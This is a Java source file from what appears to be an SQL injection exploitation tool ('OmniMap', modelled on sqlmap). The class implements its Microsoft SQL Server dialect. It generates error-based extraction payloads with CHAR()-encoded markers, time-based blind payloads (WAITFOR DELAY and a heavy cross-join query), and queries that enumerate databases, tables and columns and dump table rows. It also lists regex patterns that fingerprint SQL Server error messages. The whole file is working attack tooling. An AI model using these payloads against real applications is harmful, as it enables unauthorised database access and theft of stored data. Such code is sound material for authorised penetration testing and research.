package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * Microsoft SQL Server dialect for OmniMap.
 * Uses INFORMATION_SCHEMA, SUBSTRING(), CHAR(), WAITFOR DELAY, IIF/CASE,
 * and CONVERT type-conversion errors for error-based extraction.
 */
public class MssqlDialect implements DbmsDialect {

    /** Random markers for error-based extraction (like sqlmap's kb.chars.start/stop) */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;
    private final int errorRandNum;

    public MssqlDialect() {
        this.errorPrefixDecoded = randomMarker(4);
        this.errorSuffixDecoded = randomMarker(5);
        this.errorRandNum = ThreadLocalRandom.current().nextInt(1000, 10000);
    }

    @Override
    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }

    @Override
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomMarker(int length) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) rng.nextInt(0x71, 0x79));
        }
        return sb.toString();
    }

    /**
     * Convert a marker string to CHAR(n)+CHAR(n)+... format.
     * Markers built from CHAR() calls only appear in error output, not reflected SQL.
     */
    private static String toCharConcat(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            if (i > 0) sb.append("+");
            sb.append("CHAR(").append((int) s.charAt(i)).append(")");
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "MSSQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT DB_NAME()";
    }

    @Override
    public String listDatabases() {
        return "SELECT name FROM master.dbo.sysdatabases";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM " + database + ".INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM " + database + ".INFORMATION_SCHEMA.COLUMNS WHERE table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "ISNULL(CAST([" + c + "] AS NVARCHAR(MAX)),CHAR(32))")
                .collect(Collectors.joining("+CHAR(124)+"));
        // MSSQL 2012+: OFFSET/FETCH for deterministic pagination (matches limitOffset approach).
        // Old NOT IN (SELECT TOP n) approach was non-deterministic without ORDER BY.
        return "SELECT " + cols + " FROM [" + database + "].dbo.[" + table
                + "] ORDER BY 1 OFFSET " + offset + " ROWS FETCH NEXT " + limit + " ROWS ONLY";
    }

    @Override
    public String charFunction(int ascii) {
        return "CHAR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTRING((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LEN((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "WAITFOR DELAY '0:0:" + seconds + "'";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "IIF(" + condition + "," + trueVal + "," + falseVal + ")";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("+", parts);
    }

    @Override
    public List<String> errorFunctions() {
        // sqlmap MSSQL error functions with CHAR() delimiter markers.
        // CHAR() calls ensure markers only appear in error output, not reflected SQL.
        String pChar = toCharConcat(errorPrefixDecoded);
        String sChar = toCharConcat(errorSuffixDecoded);
        return List.of(
                // Level 1 (#21): IN (SELECT) — exact sqlmap format
                errorRandNum + " IN (SELECT (" + pChar + "+(%s)+" + sChar + "))",
                // Level 2 (#23): CONVERT with delimiters
                errorRandNum + "=CONVERT(INT,(SELECT " + pChar + "+(%s)+" + sChar + "))",
                // Level 2 (#25): CONCAT with delimiters (SQL Server 2012+)
                errorRandNum + "=CONCAT(" + pChar + ",(%s)," + sChar + ")"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        List<String> all = errorFunctions();
        // sqlmap: L1=IN, L2=+CONVERT+CONCAT
        if (level >= 2) return all;
        return all.subList(0, 1); // Level 1: IN only
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap always uses 7 cross-joined sysusers tables for MSSQL heavy queries
        return "(SELECT COUNT(*) FROM sysusers AS t1,sysusers AS t2,sysusers AS t3,sysusers AS t4,sysusers AS t5,sysusers AS t6,sysusers AS t7)";
    }

    /** Pre-compiled error patterns — sqlmap errors.xml + ORM/framework patterns */
    private static final List<Pattern> ERROR_PATTERNS = List.of(
            // === sqlmap core patterns (errors.xml) ===
            Pattern.compile("Driver.*? SQL[\\-_\\ ]*Server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("OLE DB.*? SQL Server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\\bSQL Server[^<\"]+Driver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Warning.*?\\W(mssql|sqlsrv)_", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\\bSQL Server[^<\"]+[0-9a-fA-F]{8}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("System\\.Data\\.SqlClient\\.(SqlException|SqlConnection\\.OnError)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Microsoft SQL Native Client error '[0-9a-fA-F]{8}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\\[SQL Server\\]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ODBC SQL Server Driver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ODBC Driver \\d+ for SQL Server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLServer JDBC Driver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("com\\.jnetdirect\\.jsql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("macromedia\\.jdbc\\.sqlserver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Zend_Db_(Adapter|Statement)_Sqlsrv_Exception", Pattern.CASE_INSENSITIVE),
            Pattern.compile("com\\.microsoft\\.sqlserver\\.jdbc", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Pdo[./_\\\\](Mssql|SqlSrv)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQL(Srv|Server)Exception", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Unclosed quotation mark after the character string", Pattern.CASE_INSENSITIVE),
            // === Native MSSQL errors ===
            Pattern.compile("Incorrect syntax near", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Microsoft OLE DB Provider for (SQL Server|ODBC Drivers)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Microsoft SQL Native Client", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQL Server.*?Error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Msg \\d+, Level \\d+, State \\d+", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Conversion failed when converting", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Arithmetic overflow error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("String or binary data would be truncated", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Cannot insert the value NULL into column", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Cannot insert duplicate key", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Violation of (PRIMARY|UNIQUE) KEY constraint", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Invalid column name", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Invalid object name", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Could not find stored procedure", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Login failed for user", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Cannot open database", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Transaction \\(Process ID \\d+\\) was deadlocked", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Timeout expired.*?SQL Server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("The multi-part identifier.*?could not be bound", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Subquery returned more than 1 value", Pattern.CASE_INSENSITIVE),
            Pattern.compile("An expression of non-boolean type specified", Pattern.CASE_INSENSITIVE),
            Pattern.compile("The conversion of.*?resulted in an out-of-range", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Divide by zero", Pattern.CASE_INSENSITIVE),
            // === SQLSTATE codes ===
            Pattern.compile("SQLSTATE\\[42000\\].*?SQL Server", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLSTATE\\[08001\\].*?SQL Server", Pattern.CASE_INSENSITIVE),
            // === ORM / framework patterns ===
            Pattern.compile("Microsoft\\.Data\\.SqlClient\\.SqlException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("EntityFramework.*?SqlException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ActiveRecord::StatementInvalid.*?SQLServer", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Sequel::DatabaseError.*?mssql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("mssql\\..*?RequestError", Pattern.CASE_INSENSITIVE),
            Pattern.compile("tedious.*?RequestError", Pattern.CASE_INSENSITIVE),
            Pattern.compile("knex.*?error.*?mssql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SequelizeDatabaseError.*?mssql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("TypeORMError.*?mssql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("prisma.*?error.*?sqlserver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pyodbc\\.(ProgrammingError|OperationalError)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pymssql\\.OperationalError", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlalchemy\\.exc\\..*?mssql", Pattern.CASE_INSENSITIVE),
            Pattern.compile("FreeTDS.*?Error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("DBD::Sybase", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.hibernate\\.exception\\.SQLGrammarException.*?sqlserver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Doctrine\\\\DBAL\\\\Exception.*?sqlsrv", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Illuminate\\\\Database\\\\QueryException.*?sqlsrv", Pattern.CASE_INSENSITIVE)
    );

    @Override
    public List<Pattern> errorPatterns() {
        return ERROR_PATTERNS;
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM [" + database + "].dbo.[" + table + "]";
    }

    @Override
    public String limitOffset(String query, int limit, int offset) {
        // MSSQL 2012+: OFFSET FETCH requires ORDER BY
        return query + " ORDER BY 1 OFFSET " + offset + " ROWS FETCH NEXT " + limit + " ROWS ONLY";
    }
}
